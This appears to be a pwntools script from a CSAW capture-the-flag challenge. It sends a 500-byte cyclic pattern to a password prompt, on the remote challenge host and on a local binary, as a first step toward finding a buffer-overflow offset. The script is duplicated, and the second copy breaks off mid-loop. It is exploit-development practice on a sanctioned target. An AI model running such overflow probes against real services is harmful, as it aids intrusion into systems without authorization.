from pwn import *
import sys

# Enable debugging output
context.log_level = 'debug'

# Create cyclic pattern
pattern = cyclic(500)

try:
    # Connect to remote server
    conn = remote('pwn.chal.csaw.io', 20001)

    # Receive until password prompt
    conn.recvuntil(b'password>')

    # Send pattern
    conn.sendline(pattern)

    # Try to receive any output
    try:
        while True:
            output = conn.recv(timeout=1)
            if output:
                print("Received:", hexdump(output))
            else:
                break
    except:
        print("Connection ended")

except Exception as e:
    print("Error:", str(e))
finally:
    try:
        conn.close()
    except:
        pass

from pwn import *
import sys

# Enable debugging output
context.log_level = 'debug'

# Create cyclic pattern
pattern = cyclic(500)

try:
    # Run local binary
    p = process('./ctf_files/prog')

    # Receive until password prompt
    p.recvuntil(b'password>')

    # Send pattern
    p.sendline(pattern)

    # Try to receive any output
    try:
        while True:
